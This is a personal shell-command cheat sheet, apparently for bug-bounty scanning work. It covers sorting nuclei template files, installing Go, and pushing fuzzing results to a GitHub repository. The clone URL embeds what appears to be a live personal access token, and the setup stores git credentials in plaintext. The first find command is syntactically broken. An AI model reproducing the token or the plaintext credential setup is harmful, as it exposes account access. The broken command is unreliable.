 -> find . '.+-[a-f0-9]{32}\.yaml' | grep -E '.+-[a-f0-9]{32}\.yaml' | xargs -I {} mv {} ./temp-dir/   [find hash and move to temp dir]
 -> grep -rn "ASVS" /path/to/nuclei-templates/ | awk -F '.yaml:' '{print $1".yaml"}' >> output.yaml    [check inside "ASVS" from file ]

------------------------------------------

📌how to install golang in teminal
   - visit site https://go.dev/dl/
   - check the latest version (archive version a/c OS)
   - wget https://go.dev/dl/go1.21.3.linux-amd64.tar.gz
   - sudo tar -C /usr/local -xzf go1.21.3.linux-amd64.tar.gz
   - echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
   - source ~/.bashrc
   - go version (confirm the req. version u install 'go version go1.21.3 linux/amd64')
   - if wrong version download use this 2 cmd :
     - sudo rm -rf /usr/local/go
     - sudo rm -rf /usr/lib/go-1.19<version>


------------------------------------------

📌 github cli & authenticate via terminal
- sudo apt install gh && apt install git -y    [paste as it is]
- git config --global credential.helper store  [paste as it is]
- git clone https://aditya936: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@github.com/aditya936/targets.git

- mv /adi/bild/fuzz.txt /root/targets/openbb-fuzzing/
- cd /root/targets/openbb-fuzzing/

- git add fuzz.txt
- git commit -m "Auto-updating fuzzing results on $(date)"
- git push origin main

492E64385D3779BC5F040E2B19D67742
X-adi: 492E64385D3779BC5F040E2B19D677421111222333

https://example.com/123123456456789789
